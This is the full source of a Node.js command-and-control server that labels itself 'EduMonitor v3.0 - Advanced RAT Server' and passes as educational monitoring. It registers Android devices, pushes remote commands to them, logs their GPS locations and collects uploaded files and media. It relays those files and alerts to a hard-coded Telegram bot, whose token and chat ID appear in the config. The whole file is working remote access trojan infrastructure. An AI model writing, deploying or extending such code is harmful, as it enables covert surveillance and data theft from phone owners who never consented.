const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const axios = require('axios');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const sqlite3 = require('sqlite3').verbose();
const schedule = require('node-schedule');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const compression = require('compression');
const { v4: uuidv4 } = require('uuid');
require('dotenv').config();

// ============================================
// EXPRESS SETUP
// ============================================
const app = express();
const server = http.createServer(app);

// Trust proxy (for Render.com)
app.set('trust proxy', 1);

// ============================================
// CONFIGURATION
// ============================================
const config = {
    telegram: {
        token: process.env.TELEGRAM_BOT_TOKEN || '8655508141:AAH7ziEjGbwnAKur944BomeVvQ6nrt7jzqw',
        chatId: process.env.TELEGRAM_CHAT_ID || '5326373447'
    },
    server: {
        port: process.env.PORT || 8999,
        host: process.env.HOST || '0.0.0.0'
    },
    security: {
        encryptionKey: process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex'),
        rateLimit: 100
    },
    storage: {
        maxFileSize: 100 * 1024 * 1024, // 100MB
        retentionDays: 7
    }
};

// ============================================
// DATABASE SETUP
// ============================================
const db = new sqlite3.Database('./edumonitor.db');

db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS devices (
        id TEXT PRIMARY KEY,
        name TEXT,
        model TEXT,
        android_version TEXT,
        manufacturer TEXT,
        chat_id TEXT,
        registered_at INTEGER,
        last_seen INTEGER,
        battery_level INTEGER,
        is_active INTEGER DEFAULT 1,
        encryption_key TEXT,
        features TEXT
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS commands (
        id TEXT PRIMARY KEY,
        device_id TEXT,
        command TEXT,
        parameters TEXT,
        status TEXT,
        created_at INTEGER,
        executed_at INTEGER,
        result TEXT,
        priority INTEGER DEFAULT 0
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS locations (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        latitude REAL,
        longitude REAL,
        accuracy REAL,
        altitude REAL,
        speed REAL,
        provider TEXT,
        timestamp INTEGER
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS media (
        id TEXT PRIMARY KEY,
        device_id TEXT,
        type TEXT,
        file_path TEXT,
        thumbnail_path TEXT,
        size INTEGER,
        timestamp INTEGER,
        metadata TEXT,
        uploaded INTEGER DEFAULT 0
    )`);
});

// ============================================
// SECURITY MIDDLEWARE
// ============================================
app.use(helmet({
    contentSecurityPolicy: false, // Disable for webhook
}));
app.use(compression());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: config.security.rateLimit,
    message: { error: 'Too many requests from this IP' }
});
app.use('/api/', limiter);

// ============================================
// WEBSOCKET SERVER
// ============================================
const wss = new WebSocket.Server({ 
    server, 
    path: '/ws',
    clientTracking: true
});

// ============================================
// ENCRYPTION UTILITIES
// ============================================
const encryption = {
    encrypt(text, key = config.security.encryptionKey) {
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv('aes-256-gcm', Buffer.from(key, 'hex'), iv);
        let encrypted = cipher.update(text, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        const authTag = cipher.getAuthTag();
        return { iv: iv.toString('hex'), encrypted, authTag: authTag.toString('hex') };
    },

    decrypt(encryptedData, key = config.security.encryptionKey) {
        const decipher = crypto.createDecipheriv(
            'aes-256-gcm',
            Buffer.from(key, 'hex'),
            Buffer.from(encryptedData.iv, 'hex')
        );
        decipher.setAuthTag(Buffer.from(encryptedData.authTag, 'hex'));
        let decrypted = decipher.update(encryptedData.encrypted, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    },

    generateDeviceKey() {
        return crypto.randomBytes(32).toString('hex');
    }
};

// ============================================
// TELEGRAM BOT INTEGRATION
// ============================================
const TELEGRAM_API = `https://api.telegram.org/bot${config.telegram.token}`;

async function setWebhook() {
    try {
        const webhookUrl = `https://edu2-801s.onrender.com/webhook`;
        const response = await axios.post(`${TELEGRAM_API}/setWebhook`, {
            url: webhookUrl,
            allowed_updates: ["message", "callback_query"]
        });
        console.log('✅ Webhook set:', response.data);
    } catch (error) {
        console.error('❌ Failed to set webhook:', error.response?.data || error.message);
    }
}

async function sendTelegramMessage(chatId, text, options = {}) {
    try {
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
            ...options
        });
        return response.data;
    } catch (error) {
        console.error('Telegram send error:', error.response?.data || error.message);
        return null;
    }
}

async function sendTelegramDocument(chatId, filePath, filename, caption = '') {
    try {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('document', fs.createReadStream(filePath), { filename });
        formData.append('caption', caption);

        await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
            headers: formData.getHeaders()
        });
    } catch (error) {
        console.error('Document send error:', error);
    }
}

// ============================================
// DEVICE MANAGER
// ============================================
class DeviceManager {
    constructor() {
        this.devices = new Map();
        this.wsConnections = new Map();
    }

    registerDevice(deviceId, ws, deviceInfo) {
        const deviceKey = encryption.generateDeviceKey();
        
        const device = {
            id: deviceId,
            ws,
            info: deviceInfo,
            registeredAt: Date.now(),
            lastSeen: Date.now(),
            key: deviceKey,
            batteryLevel: deviceInfo.battery,
            pendingCommands: []
        };

        this.devices.set(deviceId, device);
        this.wsConnections.set(ws, deviceId);
        
        return device;
    }

    updateDevice(deviceId, data) {
        const device = this.devices.get(deviceId);
        if (device) {
            Object.assign(device, data);
            device.lastSeen = Date.now();
        }
    }

    sendCommand(deviceId, command, parameters = {}, callback = null) {
        const device = this.devices.get(deviceId);
        if (!device) return { success: false, error: 'Device not found' };

        const commandId = uuidv4();
        const cmd = {
            id: commandId,
            command,
            parameters,
            timestamp: Date.now()
        };

        try {
            if (device.ws && device.ws.readyState === WebSocket.OPEN) {
                device.ws.send(JSON.stringify({
                    type: 'command',
                    id: commandId,
                    data: cmd
                }));
                
                db.run(`INSERT INTO commands (id, device_id, command, parameters, status, created_at)
                    VALUES (?, ?, ?, ?, 'sent', ?)`,
                    [commandId, deviceId, command, JSON.stringify(parameters), Date.now()]
                );
                
                return { success: true, commandId };
            } else {
                device.pendingCommands.push(cmd);
                return { success: true, commandId, queued: true };
            }
        } catch (error) {
            console.error(`Error sending command to ${deviceId}:`, error);
            return { success: false, error: error.message };
        }
    }

    broadcastToDevices(message) {
        this.devices.forEach((device) => {
            if (device.ws && device.ws.readyState === WebSocket.OPEN) {
                device.ws.send(JSON.stringify(message));
            }
        });
    }

    disconnectDevice(deviceId) {
        const device = this.devices.get(deviceId);
        if (device) {
            if (device.ws) {
                this.wsConnections.delete(device.ws);
            }
            this.devices.delete(deviceId);
            
            db.run(`UPDATE devices SET is_active = 0 WHERE id = ?`, [deviceId]);
        }
    }
}

const deviceManager = new DeviceManager();

// ============================================
// WEBSOCKET CONNECTION HANDLING
// ============================================
wss.on('connection', (ws, req) => {
    const deviceId = req.headers['device-id'];
    let deviceInfo = {};
    
    try {
        deviceInfo = JSON.parse(req.headers['device-info'] || '{}');
    } catch (e) {
        console.error('Error parsing device info:', e);
    }

    if (!deviceId) {
        ws.close(1008, 'Device ID required');
        return;
    }

    // Register device
    const device = deviceManager.registerDevice(deviceId, ws, {
        ...deviceInfo,
        chatId: config.telegram.chatId
    });

    ws.send(JSON.stringify({
        type: 'registered',
        deviceId: device.id,
        timestamp: Date.now()
    }));

    // Send welcome notification to Telegram
    sendTelegramMessage(config.telegram.chatId, 
        `✅ *Device Connected*\nModel: ${device.info.model || 'Unknown'}\nAndroid: ${device.info.androidVersion || 'Unknown'}`,
        { parse_mode: 'Markdown' }
    );

    ws.on('message', async (data) => {
        try {
            const message = JSON.parse(data);
            
            switch (message.type) {
                case 'pong':
                    deviceManager.updateDevice(deviceId, { lastSeen: Date.now() });
                    break;

                case 'response':
                    await handleDeviceResponse(deviceId, message);
                    break;

                case 'location':
                    await handleDeviceLocation(deviceId, message.data);
                    break;

                case 'battery':
                    deviceManager.updateDevice(deviceId, { batteryLevel: message.level });
                    db.run(`UPDATE devices SET battery_level = ? WHERE id = ?`, [message.level, deviceId]);
                    break;
            }
        } catch (error) {
            console.error('Error processing message:', error);
        }
    });

    ws.on('close', () => {
        deviceManager.disconnectDevice(deviceId);
        sendTelegramMessage(config.telegram.chatId, 
            `❌ *Device Disconnected*\nModel: ${device.info.model || 'Unknown'}`);
    });

    ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
});

// ============================================
// RESPONSE HANDLERS
// ============================================
async function handleDeviceResponse(deviceId, message) {
    const { commandId, success, data, error } = message;
    
    db.run(`UPDATE commands SET status = ?, result = ?, executed_at = ? WHERE id = ?`,
        [success ? 'completed' : 'failed', JSON.stringify(data || error), Date.now(), commandId]
    );
}

async function handleDeviceLocation(deviceId, locationData) {
    const device = deviceManager.devices.get(deviceId);
    if (!device) return;

    db.run(`INSERT INTO locations 
        (device_id, latitude, longitude, accuracy, provider, timestamp)
        VALUES (?, ?, ?, ?, ?, ?)`,
        [
            deviceId,
            locationData.lat,
            locationData.lon,
            locationData.accuracy,
            locationData.provider,
            locationData.timestamp || Date.now()
        ]
    );
}

// ============================================
// API ENDPOINTS - CRITICAL: THESE MUST COME FIRST
// ============================================

// Health check (public)
app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        devices: deviceManager.devices.size,
        timestamp: Date.now()
    });
});

// IMPORTANT: Device registration endpoint
app.post('/api/register', (req, res) => {
    console.log('📥 Registration request received:', req.body);
    
    const { deviceId, chatId, deviceInfo } = req.body;

    if (!deviceId) {
        console.error('❌ Missing deviceId in registration');
        return res.status(400).json({ error: 'Missing deviceId' });
    }

    // Generate device key
    const deviceKey = encryption.generateDeviceKey();
    
    // Store in database
    db.run(`INSERT OR REPLACE INTO devices 
        (id, model, android_version, manufacturer, chat_id, registered_at, last_seen, battery_level, encryption_key, features) 
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
        [
            deviceId,
            deviceInfo?.model || 'Unknown',
            deviceInfo?.android || 'Unknown',
            deviceInfo?.manufacturer || 'Unknown',
            chatId || config.telegram.chatId,
            Date.now(),
            Date.now(),
            deviceInfo?.battery || 100,
            deviceKey,
            JSON.stringify(deviceInfo?.features || [])
        ],
        function(err) {
            if (err) {
                console.error('❌ Database error during registration:', err);
                return res.status(500).json({ error: 'Database error', details: err.message });
            }
            
            console.log(`✅ Device registered successfully: ${deviceId} (${deviceInfo?.model || 'Unknown'})`);
            
            // Send Telegram notification
            sendTelegramMessage(config.telegram.chatId, 
                `✅ *New Device Registered*\nID: \`${deviceId.substring(0, 8)}...\`\nModel: ${deviceInfo?.model || 'Unknown'}\nAndroid: ${deviceInfo?.android || 'Unknown'}`,
                { parse_mode: 'Markdown' }
            );
            
            res.json({
                success: true,
                deviceId,
                key: deviceKey,
                serverTime: Date.now()
            });
        }
    );
});

// Ping endpoint
app.get('/api/ping/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    
    db.run(`UPDATE devices SET last_seen = ? WHERE id = ?`, 
        [Date.now(), deviceId], 
        function(err) {
            if (err) {
                console.error('Ping error:', err);
                return res.status(500).json({ error: 'Database error' });
            }
            
            if (this.changes === 0) {
                return res.status(404).json({ error: 'Device not found' });
            }
            
            res.json({ 
                success: true, 
                timestamp: Date.now() 
            });
        }
    );
});

// Get commands for device
app.get('/api/commands/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    
    db.all(`SELECT id, command, parameters FROM commands 
            WHERE device_id = ? AND status = 'sent' 
            ORDER BY created_at ASC LIMIT 10`, 
        [deviceId], 
        (err, rows) => {
            if (err) {
                console.error('Command query error:', err);
                return res.status(500).json({ error: 'Database error' });
            }
            
            // Mark commands as delivered
            if (rows && rows.length > 0) {
                const ids = rows.map(r => r.id);
                const placeholders = ids.map(() => '?').join(',');
                db.run(`UPDATE commands SET status = 'delivered' 
                        WHERE id IN (${placeholders})`, ids);
            }
            
            res.json({ 
                commands: rows || [],
                timestamp: Date.now()
            });
        }
    );
});

// Submit command result
app.post('/api/result/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    const { commandId, success, data, error } = req.body;
    
    db.run(`UPDATE commands SET status = ?, result = ?, executed_at = ? 
            WHERE id = ?`,
        [success ? 'completed' : 'failed', 
         JSON.stringify(data || error || {}), 
         Date.now(), 
         commandId],
        function(err) {
            if (err) {
                console.error('Result update error:', err);
                return res.status(500).json({ error: 'Database error' });
            }
            
            res.json({ success: true });
        }
    );
});

// File upload endpoint
const upload = multer({ 
    dest: 'uploads/',
    limits: { fileSize: config.storage.maxFileSize }
});

app.post('/api/upload-file', upload.single('file'), async (req, res) => {
    try {
        const { deviceId, fileType, caption, filename } = req.body;
        const file = req.file;

        if (!deviceId || !file) {
            return res.status(400).json({ error: 'Missing fields' });
        }

        const mediaId = uuidv4();
        const fileExt = path.extname(filename || file.originalname);
        const newPath = path.join('uploads', `${mediaId}${fileExt}`);

        // Ensure uploads directory exists
        if (!fs.existsSync('uploads')) {
            fs.mkdirSync('uploads', { recursive: true });
        }

        fs.renameSync(file.path, newPath);

        db.run(`INSERT INTO media (id, device_id, type, file_path, size, timestamp, metadata)
            VALUES (?, ?, ?, ?, ?, ?, ?)`,
            [mediaId, deviceId, fileType || 'unknown', newPath, file.size, Date.now(), 
             JSON.stringify({ caption, filename })],
            async function(err) {
                if (err) {
                    console.error('Media insert error:', err);
                    return res.status(500).json({ error: 'Database error' });
                }
                
                // Get device info and send to Telegram
                db.get('SELECT * FROM devices WHERE id = ?', [deviceId], async (err, device) => {
                    if (!err && device) {
                        await sendTelegramDocument(
                            config.telegram.chatId, 
                            newPath, 
                            filename || file.originalname,
                            `${caption || '📎 File'} from ${device.model || 'Device'}`
                        );
                    }
                });
                
                res.json({ success: true, mediaId });
            }
        );

    } catch (error) {
        console.error('Upload error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Location endpoint
app.post('/api/location/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    const locationData = req.body;

    handleDeviceLocation(deviceId, locationData);
    res.json({ success: true });
});

// ============================================
// TELEGRAM WEBHOOK HANDLER
// ============================================
app.post('/webhook', (req, res) => {
    res.sendStatus(200);
    console.log('📨 Webhook received:', req.body);
    // Add your webhook handling logic here
});

// ============================================
// 404 HANDLER - MUST BE LAST
// ============================================
app.use((req, res) => {
    console.log(`❌ 404 - Not Found: ${req.method} ${req.url}`);
    res.status(404).json({ 
        error: 'Endpoint not found',
        path: req.url,
        method: req.method
    });
});

// Error handler
app.use((err, req, res, next) => {
    console.error('Server error:', err.stack);
    res.status(500).json({ 
        error: 'Internal server error', 
        message: err.message 
    });
});

// ============================================
// CLEANUP JOBS
// ============================================
schedule.scheduleJob('0 0 * * *', () => {
    const cutoff = Date.now() - config.storage.retentionDays * 24 * 60 * 60 * 1000;
    
    db.all('SELECT file_path FROM media WHERE timestamp < ?', [cutoff], (err, media) => {
        if (err || !media) return;
        media.forEach(item => {
            try {
                if (item.file_path && fs.existsSync(item.file_path)) {
                    fs.unlinkSync(item.file_path);
                }
            } catch (error) {
                console.error('Cleanup error:', error);
            }
        });
    });

    db.run('DELETE FROM media WHERE timestamp < ?', [cutoff]);
    db.run('DELETE FROM locations WHERE timestamp < ?', [cutoff]);
});

// ============================================
// START SERVER
// ============================================
server.listen(config.server.port, config.server.host, () => {
    console.log('\n🚀 ===============================================');
    console.log(`🚀 EduMonitor v3.0 - Advanced RAT Server`);
    console.log(`🚀 ===============================================`);
    console.log(`\n📡 HTTP Server: http://${config.server.host}:${config.server.port}`);
    console.log(`🔌 WebSocket: ws://${config.server.host}:${config.server.port}/ws`);
    console.log(`🤖 Telegram Bot: @${config.telegram.token.split(':')[0]}`);
    console.log(`📊 Database: SQLite3 (edumonitor.db)`);
    
    // Set webhook
    setWebhook();

    console.log(`\n✅ API Endpoints:`);
    console.log(`   └─ POST /api/register - Device registration`);
    console.log(`   └─ GET /api/ping/:deviceId - Keep-alive`);
    console.log(`   └─ GET /api/commands/:deviceId - Get commands`);
    console.log(`   └─ POST /api/result/:deviceId - Command results`);
    console.log(`   └─ POST /api/upload-file - File upload`);
    console.log(`   └─ POST /api/location/:deviceId - Location updates`);
    console.log(`   └─ POST /webhook - Telegram webhook`);
    console.log(`   └─ GET /health - Health check`);
    
    console.log(`\n🚀 ===============================================\n`);
});

// Graceful shutdown
process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);

function shutdown() {
    console.log('\n🛑 Shutting down gracefully...');
    deviceManager.broadcastToDevices({ type: 'shutdown', timestamp: Date.now() });
    wss.close();
    server.close(() => {
        db.close();
        process.exit(0);
    });
}
